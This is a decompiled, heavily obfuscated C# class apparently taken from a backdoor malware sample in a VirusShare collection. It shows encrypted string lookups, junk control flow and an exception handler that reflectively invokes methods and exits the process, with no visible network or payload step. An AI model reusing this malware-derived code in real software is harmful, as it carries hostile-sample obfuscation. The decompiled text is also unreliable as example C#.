// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 5, Version=0.0.0.0, Culture=neutral, PublicKeyToken=c1ca78561cb11ead
// MVID: 2D47F565-522D-4F7E-99C5-0FAB4FA0B168
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Poison.eqbg-1d1c34c3e9b902e7445301b77a51949865f13999db65bb166e4f7800abbf116b.exe

using \u0003;
using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0002
{
  internal abstract class \u0004
  {
    private static readonly bool \u0001;
    internal static readonly string \u0001;
    internal static \u0002.\u0004 \u0001;
    private IWebProxy \u0001;
    internal EventHandler \u0001;
    internal \u0006 \u0001;
    [NonSerialized]
    internal static \u000F.\u0002 \u0086;

    protected abstract void \u0001([In] \u000E.\u0003 obj0);

    protected abstract void \u0001([In] \u0008.\u0003 obj0);

    protected abstract void \u0001([In] \u0005.\u0004 obj0);

    protected virtual Guid \u0001() => Guid.Empty;

    internal bool \u0001([In] SecurityException obj0)
    {
      if (true)
        goto label_6;
label_5:
      int num = 1;
      return num == 0 ? num != 0 : num != 0;
label_6:
      \u0005.\u0004 obj = new \u0005.\u0004(obj0);
      if (true)
      {
        this.\u0001(obj);
        if (obj.\u0002)
          return false;
        if (!obj.\u0001)
        {
          \u000F\u0002.\u0019\u0003();
          goto label_5;
        }
        else
          goto label_5;
      }
      else
        goto label_5;
    }

    internal unsafe void \u0001([In] Exception obj0, [In] bool obj1, [In] bool obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      \u0007.\u0004.\u0001(2U);
      Type type = \u0082.\u007E\u001F\u0002((object) obj0);
      if (\u001C.\u0012\u0002(\u0015.\u007E\u0094((object) type), \u0002.\u0004.\u0086(1789)) && \u001C.\u0012\u0002(\u0015.\u007E\u0099((object) type), \u0002.\u0004.\u0086(1814)))
        obj0 = (Exception) \u0017.\u007E\u0005\u0002((object) \u009C.\u007E\u0005\u0003((object) type, \u0002.\u0004.\u0086(1859)), (object) obj0);
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
      if (obj0 == null)
        return;
      if (obj0 is ThreadAbortException)
        return;
      try
      {
        \u0002.\u0003 obj3 = new \u0002.\u0003(this.\u0001(), obj0, this.\u0001);
        \u0007.\u0004.\u0001(new \u0006(((\u0007.\u0004) this).\u0001), (\u0004.\u0002) obj3);
        \u0007.\u0004.\u0001(new EventHandler(((\u0007.\u0004) this).\u0001), obj3);
        \u0007.\u0004.\u0001(obj3, new \u000E.\u0002(this.\u0001));
        \u000E.\u0003 obj4 = new \u000E.\u0003(obj3, obj0);
        if (\u0007.\u0004.\u0001() != null)
          obj4.\u0001 = true;
        if (!obj1)
        {
          obj4.\u0003 = false;
          obj4.\u0004 = false;
        }
        else if (obj2 || \u0002.\u0004.\u0001)
        {
          obj4.\u0003 = false;
          if (true)
            obj4.\u0004 = true;
        }
        this.\u0001(obj4);
        *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) !obj4.\u0004;
      }
      catch (ThreadAbortException ex)
      {
      }
      catch (Exception ex)
      {
        this.\u0001(new \u0008.\u0003(ex));
      }
      if (*(sbyte*) ((IntPtr) voidPtr + 4) == (sbyte) 0)
        return;
      Assembly[] assemblyArray = \u0011\u0002.\u007E\u001B\u0003((object) \u0010\u0002.\u001A\u0003());
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < assemblyArray.Length)
      {
        Assembly assembly = assemblyArray[*(int*) voidPtr];
        try
        {
          string str = \u0015.\u007E\u0093((object) assembly);
          if (\u0016.\u007E\u0001\u0002((object) str, \u0002.\u0004.\u0086(1884)))
          {
            if (\u0016.\u007E\u0002\u0002((object) str, \u0002.\u0004.\u0086(1909)))
            {
              object obj5 = \u0014\u0002.\u007E\u001E\u0003((object) \u0013\u0002.\u007E\u001D\u0003((object) \u0012\u0002.\u007E\u001C\u0003((object) \u008B.\u007E\u0091\u0002((object) assembly, \u0002.\u0004.\u0086(1942)), \u0002.\u0004.\u0086(1979))), (object) null, (object[]) null);
              object obj6 = \u0014\u0002.\u007E\u001E\u0003((object) \u0015\u0002.\u007E\u001F\u0003((object) \u0082.\u007E\u001D\u0002(obj5), \u0002.\u0004.\u0086(1992), new Type[0]), obj5, (object[]) null);
            }
          }
        }
        catch
        {
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      try
      {
        \u000F\u0002.\u0019\u0003();
      }
      catch
      {
        try
        {
          \u0016\u0002.\u007F\u0003(0);
        }
        catch
        {
        }
      }
    }

    private void \u0001([In] object obj0, [In] \u0008.\u0003 obj1) => this.\u0001(obj1);

    static \u0004()
    {
      if (false)
        return;
      \u0003.\u0003.\u0001(typeof (\u0002.\u0004));
      \u0002.\u0004.\u0001 = \u0017\u0002.\u0080\u0003(\u0002.\u0004.\u0086(2005));
      \u0002.\u0004.\u0001 = \u0002.\u0004.\u0086(376);
    }
  }
}
